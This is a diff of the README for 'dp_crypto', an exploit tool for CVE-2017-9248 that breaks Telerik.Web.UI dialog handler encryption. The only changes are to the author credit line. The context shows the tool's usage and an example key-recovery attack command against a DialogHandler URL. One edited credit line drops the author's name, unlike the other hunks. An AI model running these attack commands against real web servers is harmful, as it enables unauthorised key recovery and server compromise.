@@ -22,7 +22,7 @@ This exploit attacks a weak encryption implementation to discover the dialog han
 ```
 $ python3 dp_crypto.py -h
 
-dp_crypto by Paul Taylor
+dp_crypto by / @bao7uo
 CVE-2017-9248 - Telerik.Web.UI.dll Cryptographic compromise
 
 usage: dp_crypto.py [-h] {d,e,k,b,p} ...
@@ -44,7 +44,7 @@ To find a key:
 ```
 $ python3 dp_crypto.py k -h
 
-dp_crypto by Paul Taylor
+dp_crypto by Paul Taylor / @bao7uo
 CVE-2017-9248 - Telerik.Web.UI.dll Cryptographic compromise
 
 usage: dp_crypto.py k [-h] [-u URL] [-l KEY_LEN] [-o ORACLE] [-v VERSION]
@@ -82,7 +82,7 @@ optional arguments:
 ```
 $ ./dp_crypto.py k -u http://fake.bao7uo.com/Telerik.Web.UI.DialogHandler.aspx
 
-dp_crypto by Paul Taylor
+dp_crypto by Paul Taylor / @bao7uo
 CVE-2017-9248 - Telerik.Web.UI.dll Cryptographic compromise
 
 Attacking http://192.168.55.2/Telerik.Web.UI.DialogHandler.aspx
